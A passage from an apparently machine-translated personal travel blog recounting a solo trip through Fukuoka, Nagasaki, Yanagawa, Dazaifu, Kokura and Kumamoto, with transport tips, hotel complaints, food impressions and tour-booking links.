saw a sign indicating the direction to my destination and where to wait for the bus; in addition to Hakata, there are other destinations available. You can refer to this article or the official website for more information; if you’re going far, make sure to check the schedule.I originally planned to take the No. 2 train directly to Hakata Station, but it seems the last train was still an hour away (I forgot), so I switched to the No. 1 train to Fukuoka Airport Domestic Terminal (Fukuoka Airport Station), then took the subway to Hakata and transferred to the Nanakuma Line to Watanabe-dori Station.Hello Fukuoka!The hotel I was staying at is on the left side of the second photo.A brief overview of the hotel: it feels a bit old, the lighting is dim, sound insulation is average, and the air conditioning is a bit noisy, but it’s still clean and tidy. However, I do regret not spending a little more to stay at the nearby APA chain hotel.I originally planned to visit the yatai (street food stalls) on the first night, but I was too tired, so I just grabbed something quick from a convenience store and went to bed early to prepare for the next day’s itinerary.Day 2: NagasakiIn the morning, I looked out from my bed at the view of Fukuoka city.Hakata StationI took the subway to Hakata, then walked to Watanabe-dori to catch a bus to Hakata, which was faster.After arriving in Hakata, I first went to the ticket counter to exchange my JR Pass (showing my passport) and reserved a seat for Nagasaki. There were many foreigners exchanging their JR Passes, and I waited for almost an hour, so I recommend heading out early or exchanging it in advance. The JR Kyushu Pass can currently only be exchanged at the ticket counter, so be sure to queue up early. If there are too many people at Hakata Station, you might want to consider exchanging it at a nearby station for a quicker experience! Link I bought a five-day pass, which starts counting from the day I exchanged it. I used this pass to enter and exit the stations (the one with the date and amount), while the reserved seat ticket is just for knowing where your seat is and cannot be used to enter or exit the station. Keep this pass safe, as you’ll need it for the next five days; if you lose it, it’s gone!The journey from Hakata to Nagasaki has two segments: first to Takeo Onsen, then transferring at Takeo Onsen to go to Nagasaki. You change trains on the same platform, and they have the schedules well-timed, so basically, you just walk straight across to the other side after arriving.While waiting for the train, I noticed that the trains in Kyushu have a lot of character!The seats are spacious and comfortable, and the window view is great.Travel time: approximately 1 hour and 50 minutesA little side story: Completed a bit of national diplomacy ✅ I was seated next to a family on the train, and halfway through, one of the kids suddenly threw up. The dad, not having any tissues, had to use a newspaper, so I handed him some tissues and wet wipes. When we were about to get off, the dad gave me a souvenir from Miyama City (shrimp rice crackers).Nagasaki StationThe weather was great when I exited Nagasaki Station! I was worried it might rain today.After exiting, I headed towards the Nagasaki tram.Nagasaki (South)My first stop was to head south to Nagasaki Shinchi Chinatown for a stroll.It might be a unique spot for foreigners, but for Chinese people, it’s just okay. They sell Nagasaki specialties like kakuni buns, long plate udon, strong stick noodles, and soup dumplings… but I wasn’t very hungry at the time, so I just walked through and left.I continued towards Glover Garden, passing by the Confucius Temple along the way XD.I walked past Dutch Slope (which is just a slope) and took the escalator up to the No. 2 entrance of Glover Garden. The entire area is a hillside facing the sea.At Glover Garden, I took a quick look around at the architectural styles and interior decorations; it reminded me a lot of Fort San Domingo in Tamsui (since both were established by the Dutch).Don’t forget to exchange for a free photo here, which also offers a view of the cruise ships in Nagasaki Port.On my way down, I passed by the Oura Catholic Church. I didn’t go inside, just took a photo and left.I bought a Nagasaki kakuni bun to try, but I think the ones in Taiwan are better!On my way back north towards the Nagasaki Atomic Bomb Museum, I stopped at the Megane Bridge to take some photos. The reflection in the water from the front view is really beautiful, and it’s worth a shot if you have the time.Nagasaki (North)Visiting the Atomic Bomb Museum was more about immersion and reflection. The venue is designed with many scenes (from the time of the explosion or immersive experiences), installation art, historical materials, and interviews; it allows visitors to immerse themselves in the historical atmosphere and reflect on the horrors of war.After exiting the museum, just ahead is the atomic bomb explosion point, Peace Park.Along the way (including the Atomic Bomb Museum), there are many colorful paper cranes hanging, symbolizing the prayer for peace.Inasayama Night ViewAfter leaving Peace Park, I stopped by a convenience store to rest a bit before heading out to see one of the three great night views of the world, the Inasayama night view.I checked the bus schedule, and after a short walk from the convenience store, there was a bus stop to the base of Inasayama for the cable car (Yushinji Station), so I strolled to the station to wait for the bus.However, I was caught off guard by a bus delay. This small station didn’t have an electronic display board, and Google Maps said the bus had left, but I didn’t see it; after waiting for over five minutes, I thought maybe it wasn’t running today, so I quickly checked for other nearby stops that went to Yushinji and walked another ten minutes to catch another bus. The funny thing is that halfway there, I saw the delayed bus finally arrive… but it was too late Orz.After getting off, right across was Yushinji Shrine. I walked up through a kindergarten, and then I reached the Nagasaki Cable Car (Yushinji Station). Since I didn’t plan to stay too late, I just bought a round-trip ticket (which was cheaper, but if you stay too late, the cable car stops running, and you’ll have to take the bus back).It felt a bit like the ride from Wulai to Unzen Resort.After getting off the cable car, there was another scenic cable car you could take, but I didn’t try it, so I just walked straight towards the observation deck.I forgot to take a photo of the observation deck; it’s a 360-degree tower where you can see the entire Nagasaki city, port, and mountain views, and there’s no entrance fee. You can start watching the sunset from the west as the sun sets over the port and then enjoy the night view of the city from the east.The observation deck is spacious, so you don’t have to worry about crowds.After sunset, you can see the night view of the entire Nagasaki city and station, which is beautiful.Finally, I took one last look at the night view of Nagasaki Station and bought some Nagasaki cakes as souvenirs (later I found out they were also sold in Hakata, with a shelf life of about 12 days, so I could have bought them later…), and prepared to head back to Hakata.I encountered another delay, this time with JR (signal failure); it was delayed for almost an hour before I finally arrived in Hakata (exhausted), and the driver was speeding, making it feel quite bumpy.I grabbed a late-night snack and headed back to the hotel to rest.Day 3: Yanagawa and Dazaifu Day Trip + LalaPort FukuokaIn the morning, I first went to the Fukuoka (Tenjin) Tourist Center to buy a day pass (you can purchase it at Fukuoka Tenjin, Yakuin, or online), and you can calculate if it’s cheaper that way. KKday 【Kyushu Tickets】 Dazaifu and Yanagawa Tour Package (Pick up at Taoyuan Airport)Nishitetsu — One-day tour of the ancient capital Dazaifu and the water town Yanagawa.Additionally, you will receive two coupon books, one for Dazaifu that includes a voucher for a free umekawashi (plum rice cake).There’s no fixed order, but the boat rides have a time limit, and they stop after 2 PM; so I followed the flow: Fukuoka -&gt; Yanagawa -&gt; Dazaifu -&gt; Fukuoka.After buying the tickets, I went to the manual window, showed the staff my ticket, and was able to enter the station directly to take the train to Yanagawa (no seat reservation needed).Travel time: approximately 1 hour and 10 minutesYanagawa Boat RideAfter exiting the station, you’ll see staff in white vests (if not, there’s a service center nearby where you can ask) who will give you a map, return information, and a timetable, and guide you to the shuttle bus to the boat boarding area.You’ll also go through a manual ticket check where the staff will tear your ticket from Fukuoka to Yanagawa.I initially thought I could walk based on the route, but since there were staff members guiding us, I ended up taking the bus.When I arrived at the boarding area and was waiting for the next boat, I happened to meet a family from Taiwan traveling together, so I joined them and chatted along the way (since I was traveling alone and didn’t speak Japanese XD, I hadn’t talked to anyone in Kyushu).The water is very clean, and while it’s not as beautiful in this season with all the greenery, there are relatively fewer people.The boatman will introduce the sights along the way and sing songs (most Taiwanese would have heard of them, many are old songs).Here’s the translated text in naturalistic English, while keeping the original markdown image sources:When crossing the bridge, the boatman asks everyone to duck to avoid hitting their heads, which is quite amusing. There isn’t much shade along the way, so it can get a bit sunny.Along the route, we pass by an ice shop that sells fruit ice, perfect for cooling off. The boatman also hands out ice packs to everyone to help beat the heat (very thoughtful).I chatted with the father of a Taiwanese family who was traveling in a group, and I even got a business card from him.After getting off the boat, I couldn’t find a seat on the free shuttle bus and ended up in the wrong line, getting turned away from another (non-Western Railway ticket) shuttle. I need to study the map for the boarding point (Chuanliu Boat Dock, at the end of the river) or just ask someone for quicker directions.I ended up walking to catch a bus back to Nishitetsu Yanagawa Station.DazaifuTo get from Yanagawa to Dazaifu, you need to transfer at Nishitsuichi Station to catch the train to Dazaifu (you’ll need to go to another platform).Travel time: about 1 hourI took the Traveler train to Dazaifu, which goes through Nishitetsu (2.5 lines). It’s somewhat similar to the route from Beitou to Xinbeitou, with just one train going back and forth.There’s a car in the train that displays artifacts from Dazaifu and allows you to write postcards, so it’s worth checking out.Dazaifu Station is also beautiful, and the Lawson outside has a very Japanese vibe.Just to the right after exiting the station is the world’s only five-pointed (Japanese certified) Ichiran Ramen.After finishing the ramen, I had some ume mochi, which isn’t really related to plums; it’s more like red bean grilled rice cake. You have to eat the freshly made ones to enjoy their texture, and they’re delicious!I forgot to use the exchange voucher that came with the Nishitetsu ticket, so I ended up buying one for 150 yen; I noticed it has a one-day shelf life, so I couldn’t take it back to Taiwan.Continuing along Omotesando towards Dazaifu, you’ll pass one of the most beautiful Starbucks in Japan. The space is quite large, but it was crowded, so I didn’t stop and just moved on.The bridge leading to the shrine would be great for photos at night when there are fewer people, but it was too crowded for spontaneous shots.After visiting the shrine, I returned to Dazaifu Station to head back to Fukuoka Lalaport.Fukuoka LalaportI took the train back to Nishitetsuichi and then transferred to a train heading towards Hakata. I got off at Ohashi (Fukuoka), exited to the left, and found the direct bus to Lalaport. It only took one stop to reach Fukuoka Lalaport.Total travel time: about 50 minutesAs soon as I arrived, I saw the giant Fukuoka Gundam outside.Lalaport is huge, great for shopping, and suitable for families; there’s even a large playground upstairs where kids were playing and some people were lying down to rest.Upstairs, there’s a Jump Shop selling merchandise related to Shonen Jump, including Haikyuu, One Piece, Hunter x Hunter, Jujutsu Kaisen, Chainsaw Man, and more. I bought some Jujutsu merchandise.You can get a tax refund for purchases over 5000 yen, but it seems like it’s refunded to their app or something, which is a bit complicated, and food isn’t included.I went to the food court to have Miyazaki beef donburi, and on my way out, I bought some snacks for later (curry bread and Mizukawa mochi).The illuminated Gundam at night is quite impressive.For the return trip, take the direct bus, but don’t board at the original drop-off point; just follow the signs inside the building to the bus station.I returned to the hotel to rest, using my tablet (the TV was too old and didn’t have smart features); the curry bread was crispy and delicious, with meat filling, and the mochi was decent, though I prefer the ones from Benzaiten.Day 3: Mojiko, Kokura Castle, Canal City Hakata, Nakasu YataiI started the day by heading to Hakata Station to take the JR train to Mojiko, then back to Kokura Castle.Hakata to Kokura TransportA little mishapI didn’t check Google Maps beforehand and ended up on the Shinkansen Nozomi 20, which isn’t covered by the JR Pass. When I tried to exit, I was stuck and had to buy a ticket for 2,160 yen with the help of a station staff member. However, it was indeed fast; this train took only 15 minutes to reach Mojiko.MojikoI arrived at Mojiko without any issues (I was worried about getting fined).As soon as you exit the station and walk forward, you reach Mojiko, which was completely empty on a weekday; I happened to catch the Blue Wing Mojiko Bridge being lowered.After it was lowered, I walked back to the observation tower to get a bird’s eye view of the entire Mojiko.After leaving the tower, I took a stroll around Mojiko.For lunch, I had the famous curry buns from Mojiko.Kokura CastleKokura is very close to Mojiko, but Kokura Station is small. After exiting, I found myself in a desolate area and ended up walking in circles looking for the entrance. The actual entrance is on the side of the mall outside Kokura.Kokura Castle is small, but there are quite a few exhibits inside. The view from the top of the castle is pretty ordinary (the mall is right in front of it).After visiting, I returned to the station to catch a train back to Hakata. I made sure to take the JR train this time, but since it was a small station, I only had local trains, which took over an hour to get back slowly.Canal City HakataWhen I got back to Hakata, it was still early, so I decided to check out Canal City Hakata and wander around the city.I hadn’t checked much beforehand and thought it would be some kind of “castle” or “moat,” but it turned out to be a shopping mall XD. There is indeed a “moat” with a water fountain show.There are plenty of shops to explore here, including a Jump Shop.With plenty of time to spare, I wandered around and went out to eat Hakata Gion Teppanyaki Gyoza.The skin was crispy, and there was soup inside, making it very delicious. Since there was a language barrier, the staff were cute and used gestures to indicate that I should order two servings (one serving only has 8 pieces, and 16 pieces would be enough). I didn’t quite get it at the time, so I only ordered one serving plus the famous Hakata Mentai.Nakasu YataiAfter eating, it was still light out, so I took a stroll through Nakasu Yatai.Since it was still early, I headed to Tenjin’s department store (Parco) to wait for nightfall before returning to see the night view.Upstairs, there’s an Animate store, and I hit the jackpot with a gacha capsule, getting Gojo Satoru on my first try.The night view of Nakasu Yatai gives off a lively atmosphere.There are flashy and eye-catching Japanese advertisement signs.Nakasu Yatai consists of roadside food stalls, bustling with people; there’s ramen, oden, and grilled food, but nothing particularly caught my interest, so I didn’t go in to eat.I returned to the hotel to drink and have some late-night snacks while resting.Day 4: Sumiyoshi Shrine, Kushida Shrine, Tenjin Underground Shopping Street, Fukuoka Tower, Fukuoka SoftBank Hawks Baseball GameI spent the day walking around Fukuoka, starting with a visit to the nearby Sumiyoshi Shrine after leaving the hotel.Sumiyoshi ShrineIt’s small, and I wouldn’t go out of my way to visit if I weren’t nearby.I passed by Canal City Hakata again on my way to Kushida Shrine.On the way, I saw the cute little food stalls parked in the morning.Kushida ShrineKushida Shrine is larger, and I drew a fortune stick, which said that job hunting “will suddenly succeed,” giving me hope for my work situation.There’s a huge and spectacular float on display from the Hakata Gion Festival.I continued strolling through Fukuoka and stopped for lunch at Hakata Miyachiku to try Miyazaki beef.This serving of Miyazaki beef steak plus beer cost about 650 TWD, which is delicious and affordable! The Miyazaki beef was juicy and had no off-putting smell.Tenjin Underground Shopping StreetFeel free to let me know if you need any further assistance!After lunch, I wandered around Tenjin and the underground shopping area, picking up some souvenirs like little chicken cookies and cake. I also stopped by the supermarket to try some popular muscat grapes.While exploring Tenjin, I stumbled upon a wild Kumamon, the Kumamoto bear mascot.After dropping off my souvenirs at the hotel and resting for a bit, I set off for Fukuoka Tower and a baseball game.Fukuoka TowerI took a bus from the city center to Fukuoka Tower. KKday Japan・Kyushu｜Fukuoka Tower Admission TicketFukuoka Tower has a completely mirrored design, and it looks beautiful from the outside. I think it’s even prettier than the Tokyo Skytree!(Thanks to the kind passerby for taking my photo!)However, since the tower is located on the outskirts of the city by the sea, the view from the top is just okay; I’m not sure how the night view will be.After leaving Fukuoka Tower, I strolled slowly to my next stop, the Fukuoka PayPay Dome, which had a nice seaside atmosphere.Fukuoka SoftBank Hawks Baseball GameThere were a lot of people (about 70% full), but there were still tickets available for purchase at the venue.A Little Ticket Buying IncidentWhen I was buying my ticket, I encountered an elderly man at the counter who seemed nervous and shaky when he saw a foreigner. I felt nervous too! XD In a moment of confusion, I chose a designated seat in the last row, right in the middle of the front section (with people on both sides). It turned out to be super awkward to get in and out, having to say “sumimasen” all the way, and the seats were quite small. I was squeezed in among the Japanese fans, and since I don’t speak any Japanese, it was really uncomfortable… I sat stiffly through the entire game.The ticket cost nearly 1,500 TWD, and I thought I should have just bought the cheapest, worst seat to enjoy the game more comfortably.I have to say, the visual effects in the dome (being so close to the field) and the large screen animations were impressive.The Fukuoka SoftBank Hawks have a unique cheer tradition where, in the seventh inning, everyone inflates balloons (using a manual pump) and releases them. As for the trash… well, they just leave it for someone else to clean up later.In the end, the home team won 4-2, and it was more exciting than the CPBL games. The pitchers were throwing at speeds around 145 km/h, with action in every inning, and it was rare to see three outs in a row. The pace of the game was quick, making it enjoyable to watch.However, I have to say that the cheerleading aspect in Taiwan is still richer than in Japan.When the home team wins, they set off fireworks inside the dome, which is really cool!!I bought a SoftBank Hawks towel as a souvenir from my visit, which also helped me resolve the issue of not being able to enter the Hanshin Tigers’ Koshien Stadium last time.There were a lot of people leaving the stadium, but everyone kept a respectful distance and walked slowly. I followed the crowd to the nearest subway station, Chinatown Station, since it felt like the bus line would take a long time.Back at the hotel, I rested and tried the muscat grapes I bought in the afternoon. They were very sweet, almost too sweet.Day 5: Kumamoto (Kumamoto Castle, Tsuruya Department Store)I checked out early and took a stroll around the pharmacy near the hotel.I didn’t find much, so I grabbed a McDonald’s meal (a McMuffin with egg and an iced Americano for just $107) before heading back to pick up my luggage and catch the JR train to Kumamoto.Finally, I said goodbye to this hotel. The lobby had SoftBank Hawks dolls, and there was a Taiwanese flag hanging outside, which was pretty impressive since the neighboring store was a Chinese-run convenience store with many Chinese customers.Fukuoka Hakata -&gt; KumamotoI used the electronic ticket machine at the station to reserve a seat, thinking it would be a bit far and carrying luggage, so it was better to have a seat.Following the instructions, it went like this: Select the language (you have to do this first; otherwise, you can’t change it after inserting the ticket card). Insert the JR Pass ticket. Select the departure and arrival stations (search using the English station names). Choose the train and seat. Done.If you have any questions, there are staff on-site to help. I initially wanted to take a train that was leaving in 15 minutes, but it was fully booked, so I had to buy a ticket for a train leaving 45 minutes later.It turned out to be a good thing I didn’t get that earlier train. Walking from Hakata Station to the Shinkansen platform for the train to Nagasaki (via Kumamoto) took about 10 minutes, and it was a bit of a detour, which made me feel rushed.I was determined to use my JR Pass on its last day. I was initially worried that my 27-inch suitcase (about 69 x 50 x 29 cm) wouldn’t fit in the overhead compartment and that I would have to buy a large luggage seat, which requires a purchase if the total dimensions exceed 160 cm. A 27-inch suitcase can be a bit cramped, and it might bump into the person next to you. In practice, it fit quite securely in the overhead compartment, but I still had to lift it up there. I was worried about blocking the aisle when I was getting my luggage, but luckily, a kind Japanese man offered to let me take his seat to put my luggage away.Upon arriving in Kumamoto, I was greeted by a giant Kumamon. I first took the JR and subway to the hotel to drop off my luggage (at the Civic Sports Center Station).Kumamoto is filled with Kumamon everywhere…2024–11–16 Update: ⚠️⚠️Public transportation in Kumamoto Prefecture: Kyushu Sanko Bus, Sanko Bus, Kumamoto Bus, Kumamoto City Bus, and Kumamoto Electric Railway no longer accepts Suica, PASMO, ICOCA, and other IC cards for fare payment, and currently, only cash is accepted. Credit card payments may be introduced in the future, so please be aware. ⚠️⚠️⚠️⚠️⚠️⚠️⚠️Kumamoto CastleAfter dropping off my luggage at the hotel, I took the tram to Kumamoto Castle (to the Tsumachi Station).You can first visit the Sakura no Baba Josaien (I forgot to take a photo) to recharge and buy tickets for Kumamoto Castle. There weren’t many people there, but when I went to the entrance of Kumamoto Castle, I encountered a large group, which made it crowded.The ticket prices are: Kumamoto Castle 800 yen, Kumamoto Castle + the building behind it (Historical and Cultural Experience Yuyuyaku) 850 yen, Kumamoto Castle + the building behind it (Historical and Cultural Experience Yuyuyaku) + Kumamoto Museum 1,100 yen.I bought the Kumamoto Castle + Yuyuyaku ticket, thinking it was only an extra 50 yen, but after walking around, I found it to be just okay. I did get to see some exhibitions related to the castle and earthquake artifacts, which were good for photos and experiences.The restoration of Kumamoto Castle’s main keep was completed in 2023, and other buildings are still under repair (you can see cranes).The new design includes a skywalk that leads directly to Kumamoto Castle.After reaching the main keep, you can see the skywalk you walked along.You can get a bird’s-eye view of the plaza in front of Kumamoto Castle and the historical buildings that are still under repair behind it.A model showing the condition after the earthquake.Next to the plaza, I found a souvenir shop selling Kumamoto Castle models, completing my mission to collect models of the three great castles!I returned to the ticket area and visited Yuyuyaku; inside, there were models of Kumamoto Castle and a LEGO version of it, which was really cool.Since the weather wasn’t great, I didn’t continue to the museum or Kato Shrine.I walked back to Tsumachi Station, where the Amu Plaza shopping area and Kumamoto’s Tsuruya Department Store are located. The east wing of the department store recently underwent a complete renovation and features the Kumamon Plaza (Kumamon’s office).While wandering through the shopping district, I happened to come across a public event featuring Kumamon and traffic safety, where I received a Kumamon tote bag.This area isn’t particularly interesting to explore; it’s quite boring. Only the Tsutaya bookstore and the MUJI building are worth visiting. Upon arriving in Kumamoto, I immediately noticed that there were many elderly people and very few young people. The local Tsuruya Department Store mostly caters to older customers, selling women’s clothing and home goods, with very few items for younger people.I bought some Kumamon merchandise at the Kumamon-themed store in Tsuruya Department Store, which had more styles than the Kumamon Plaza. Then I went to the basement shopping area to buy some food and drinks (for dinner and a late-night snack) to take back to the hotel.The recommended local sake, Kōro, is sweet and goes down smoothly, but I felt it lacked a strong rice flavor.Green Rich Hotel - Suizenji (Green Rich Hotel Suizenji) 2023/09It’s worth mentioning that I usually don’t pay much attention to hotel reviews; I just look for places with around three stars or more. However, this hotel had poor sound insulation and happened to be filled with elementary school students on a graduation trip, so for two consecutive days, the doors kept slamming open and shut, making a lot of noise.After checking Google/Agoda for reviews, I felt a sense of empathy.Poor sound insulation seems to be a common issue with older hotels, which I can tolerate (I brought earplugs). However, the hotel’s WiFi, as previous reviewers noted, was just a sham.The WiFi had a signal throughout the hotel, but even with full bars in my room, the speed was extremely slow, and I couldn’t even load a webpage. I had to sit right by the door to get a decent speed, which made it feel like the hotel had no internet at all. The price wasn’t great either; I could have stayed in Fukuoka for the same price and booked a direct APA hotel. After this experience, I realized that even in Japan, it’s essential to check hotel reviews…Honestly, aside from being conveniently located near the airport, it had no advantages, and there were no convenience stores nearby (I had to walk over 10 minutes to find one).Day 6: Suizenji Jojuen, Kumamon Plaza Performance, Hanabata Square, Sakura Town Shopping CenterI woke up in the morning and headed straight to Suizenji Jojuen Garden across the street. [_KKday Reference Itinerary: One Day Tour in Kumamoto, Kyushu Aso Nakadake Volcano, Kusasenrigahama, Kumamoto Castle, Suizenji Jojuen Garden / All-You-Can-Eat Seasonal Fruits Departing from Fukuoka Hakata (Bilingual: Chinese, English, Japanese)_](https://www.kkday.com/zh-tw/product/38965?cid=19365&amp;ud1=d78e0b15a08a){:target=”_blank”} Suizenji Jojuen Garden (Suizen Shrine)The garden has a bit of a Lin Family Garden vibe, with everything well-organized and the water crystal clear. There’s a small Mount Fuji, Suizen Shrine, and some very plump koi fish, along with cats.Kumamon Square PerformanceAfter exploring, I took the tram to Suido-machi to head to Kumamon Square (which I visited yesterday).Inside, there are photo opportunities with Kumamon merchandise, and outside there’s a monitor to see what’s happening inside.Since it was still early before the performance at 11 AM, I decided to grab a bite at the nearby Tsuruya Department Store.You can check the performance schedule on the Kumamon official website (the times can vary, but there are usually three shows on Saturdays).While passing by Tsuruya Department Store, I spotted a somewhat sad-looking manager playing the piano.I went to the basement level to try the famous honey-filled manju, which is a thick-filled wheel cake available in white bean and red bean varieties. Those who love sweets will definitely enjoy it, especially paired with coffee for breakfast.Around 11 AM, I returned to Kumamon Square to wait for the performance. There’s no need for a lottery now; as long as you enter before the show starts, you’re good. If you arrive late, you’ll have to watch from outside on the monitor. If you have kids, you can sit inside.Before the performance, they explain the rules, such as: no hitting Kumamon, no taking photos above head height (to avoid blocking others), and if someone’s face appears in a photo, it must be blurred according to Japanese law. They encourage everyone to share on social media.The performance lasts about 30 minutes, with a host speaking for Kumamon (in Japanese). The flow includes greetings, sharing fun facts about Kumamoto, dancing (to the catchy song above), and saying hi to people from different countries (there were a lot of Taiwanese in this show XD).Kumamon is super cute, with big movements and a lot of fun.The merchandise sold in the square is limited and a bit pricey, so I didn’t buy anything there.After the performance, it was close to noon, so I walked down the shopping street to eat at Katsuretsutei Shinchiku Honten; as I walked outside the shopping street, I suddenly found myself in a more adult-oriented area, with a row of free information centers (the other side, Kumamoto Ginza Street, is similar).I ordered a super thick juicy pork cutlet rice bowl, which came with their special pickled cabbage (shared, self-serve, remember to use the red chopsticks). Everything else was the same as eating Japanese pork cutlet in Taiwan, with a grinding stick and sesame for making the sauce; rice, tea, soup, and cabbage were all free refills. I ended up eating two bowls of rice, feeling very satisfied.Hanabatake SquareAfter filling up, I continued walking down the shopping street towards Hanabatake Square.I happened to catch an event at the square on Saturday, the Food Summit 2003, with food stalls all around and a stage set up for performances.I bought a cup of sparkling wine and a grilled sausage and sat down to watch the show. The sausage wasn’t as fragrant and tasty as those in Taiwan.Halfway through eating, something fell from the stage, which was a bit startling, but it added to the atmosphere; however, it got too hot, so I left after finishing my food and headed to the nearby Sakuramachi Shopping Center to browse the department store.Hanabatake Square seems to have events every weekend, so it’s worth checking before you come; next week is the Taiwan Festival!Sakuramachi Shopping CenterOn the top floor, there’s a Kumamon waving, and the second floor has a wide selection of Kumamon merchandise ( I think it’s the most complete collection ).There will also be Kumamon performances here, so check the announcement for the schedule.You can take the stairs from the outside to the top floor to find the waving Kumamon. This building also houses the Kumamoto Bus Center, where you can buy tickets to other cities on the second floor.On the rooftop, there’s a large garden and a water play area, perfect for kids to enjoy.You can also take the escalator from inside; from the third floor’s Nisshin-ya (which was completely empty), you can find the escalator leading up. Personally, I think Sakuramachi Shopping Center is newer and more enjoyable than Tsuruya Department Store.Next to the Sakuramachi Shopping Center is the Kumamoto Prefectural Products Hall, which not only has local specialties but also some Kumamon merchandise (like Kumamon incense burners XD).On the way back, I walked through the shopping street again.I bought some clothes and miscellaneous items at Muji, and restocked on cosmetics at Matsumoto Kiyoshi (for some reason, my Visa card wouldn’t work at Matsumoto Kiyoshi; it didn’t work in Tokyo either, so I had to rely on cash this time).By the time I got back to the hotel, it was almost evening. I grabbed a quick dinner from Lawson and went to bed early to prepare for tomorrow’s trip to Aso Volcano!Day 7: Aso Volcano, Kusasenrigahama, Aso Shrine, Kumamoto Station AMU PLAZA KUMAMOTO [_KKday Reference Itinerary: [One Person Tour, Daily Departures] One Day Tour in Kumamoto Kumamoto Castle &amp; Aso Volcano Crater &amp; Kusasenrigahama (Includes All-You-Can-Eat Healthy Buffet) Departing from Fukuoka_](https://www.kkday.com/zh-tw/product/21811-kumamoto-tour-josaien-mount-aso-kumamoto-castle-hot-spring-japan?cid=19365&amp;ud1=d78e0b15a08a){:target=”_blank”} In the morning, I left the hotel and walked to the bus station to catch the express bus to Aso Station; while waiting for the bus, I encountered Kumamon again.The bus will first pass by Aso Airport (I’ll be coming here the day after tomorrow, Orz).On the way, there’s a special introduction to Aso Volcano, and they play local mountain songs to help you imagine walking through the grasslands of Aso Volcano.Upon arriving at Aso Station, there’s a statue of Usopp from One Piece outside the station for photo opportunities (I forgot to take a picture).You can buy a one-day pass for Aso Volcano from the vending machine here (which is a few hundred yen cheaper) and get the schedule. The one-day pass is only valid for the three stops listed on the schedule, and you need to take a numbered ticket to board; it seems you can’t use it at other stops.I took route 8, with the bus leaving at 10:45 AM.Travel time to the top: about 40 minutes.There weren’t many people, and as the time approached, I lined up a bit and got on the bus. Everyone seemed to be boarding; however, due to safety considerations on the mountain roads, there are no standing spots; if you’re prone to motion sickness, it’s advisable to take motion sickness medication.Aso also offers helicopter tours to see the volcano, so if you’re interested, you can look it up.Aso VolcanoKami-komezukaAs we drove up the mountain, we first passed Kusasenrigahama before reaching the top station. From the top station, you need to transfer to another bus for about 10 minutes to reach the volcano crater.I happened to meet a fellow traveler from TSMC who was also traveling alone (he was here on business XD) and it was both our first time in Aso, so we decided to team up for the itinerary.At the top station, we decided not to wait for the bus and opted to walk up the mountain (which takes about 15-20 minutes).Walking to the mountain plaza, you’ll arrive at the fourth crater of Aso Nakadake.Having a travel companion for photos is definitely a plus!It was cool up there, not hot at all, and filled with the smell of sulfur. If you have respiratory issues, you should consider your health condition.I just took a quick look around and didn’t venture to the Aso Nakadake crater; I just came up to see and then headed back down.A Little IncidentWhile chatting happily on the way down, I didn’t pay attention to the bus direction, and as it was about to leave, I hurriedly got on, only to be taken back up again. So I had to walk down once more XD.At the top station, I made sure to check the bus for route 8, route 8, route 8, heading down to Aso Station; I got off at Kusasenrigahama.KusasenrigahamaI had the famous おか牛丼 (beef bowl), which was popular and had plenty of seating, and the food came out quickly, almost no waiting.After eating, I strolled around Kusasenrigahama (it had a bit of a Qingtiangang vibe) and saw horse riding experiences available.After finishing, I took the same route 8 bus back to Aso Station, retracing my steps down the mountain.Aso ShrineWhen I arrived at Aso Station, the JR train to Aso Shrine (Miyaji Station) was about to leave in three minutes, and if I missed it, I’d have to wait another hour. I ran to the station and encountered Aso is a small station without electronic payment, so I had to buy a ticket, scrambling to buy it from the vending machine before boarding. Aso Station has only one platform, so you can just get on without thinking; later I found out that if you really don’t have time to buy a ticket, you can board directly and pay when you exit.After getting off at Miyaji Station, it’s about a 20-minute walk to Aso Shrine (just go straight, but it’s a bit far).On the way, I encountered a wild Kumamon.The shrine isn’t very large, and we finished our visit quickly; part of the shrine is also under renovation.After leaving, there’s a small shopping street next to the shrine where you can buy some snacks and take a short break. Thanks to my brother for treating me to fried beef and potato cakes.After exploring, we started to walk back slowly. I initially planned to take the 15:47 JR train back to Kumamoto, but when we got to Miyaji Station, I realized that train only had reserved seating available, and all the tickets were sold out, so we couldn’t board.Here’s the timetable; please check the schedule in advance; otherwise, you might end up like us, waiting for an hour for the next train at 16:35 back to Kumamoto.Since we had some time to spare, we decided to walk back and check out Matsumoto Kiyoshi along the way. (It’s actually quite a distance, about a 10-minute walk.)Finally, we took one last look at the tranquil Aso.The local train slowly made its way back to Kumamoto, taking about 1 hour and 45 minutes to arrive.There’s a section of the route that zigzags and goes in reverse, but don’t worry, you’re not on the wrong train!Kumamoto Station AMU PLAZA KUMAMOTOBack at Kumamoto Station, I said goodbye to my brother, hoping to meet again someday.I explored the newly opened AMU PLAZA KUMAMOTO department store (which is larger and more diverse than the Sakuramachi Shopping Center) and the nearby Higo Market (which sells food).I also discovered many Kumamon souvenirs! XDI casually had dinner at the food court, trying Miyazaki chicken (it was average), and after exploring the entire building, I bought some late-night snacks and Kumamoto strawberry wine (which was nice after tasting, so I decided to bring it back to Taiwan) before heading back to the hotel.There was a rather unique store called “BIWAN 美灣” selling Taiwanese products (I even saw some snacks), and I found out it was opened by Taiwan’s Ayu Soap.https://kumataiwanlife.com/While researching, I also found a cool website — https://kumataiwanlife.com/ that has the latest news, events, and fun facts about Kumamoto in Chinese (for example: Kumamoto’s “band-aid” is called “LIBATAPE”).Today, I discovered that the hotel vending machine sells canned draft cola, which I couldn’t find in any of the three major convenience stores. It’s a collaboration between Suntory and Pepsi, and you can’t buy it in Taiwan. It’s made using the same method as draft beer, resulting in a strong carbonation without the syrupy sweetness. I usually end up throwing away regular cola because it gets too sweet, but I could finish the draft cola!After a satisfying meal, I went to bed early, preparing for the last day in Kumamoto (excluding the day of my return flight).Day 9: Wandering and Shopping in KumamotoBy the third day in Kumamoto, I found it a bit boring since I had already visited all the attractions. I could only try to find some places to explore and buy souvenirs and cosmetics.I originally planned to go to Shimabara City, but the journey was too long (about 2 hours and 45 minutes one way), and since my JR Pass had already expired, I would have to buy a long-distance ticket, so I gave up. Oita and Yufuin were also too far, so I passed on those as well. I decided to just wander around the city and shop at a leisurely pace.Kumamoto Inahoe ShrineIn the morning, I headed to Tōmachi Street to visit Kumamoto Inahoe Shrine, which I hadn’t gone to on the first day.Kato ShrineI then walked towards Kato Shrine (it’s quite a distance, about a 20-minute walk, and there are some uphill paths).You can see the uphill path leading to Kato Shrine. You can also see the area that was under renovation from the castle tower on the first day, along with many scattered castle walls that need to be restored one by one.It’s small, and half of it is still under renovation.There was a small donation box for the Kumamoto earthquake, so I didn’t visit the shrine but instead donated.From here, you can see Kumamoto Castle 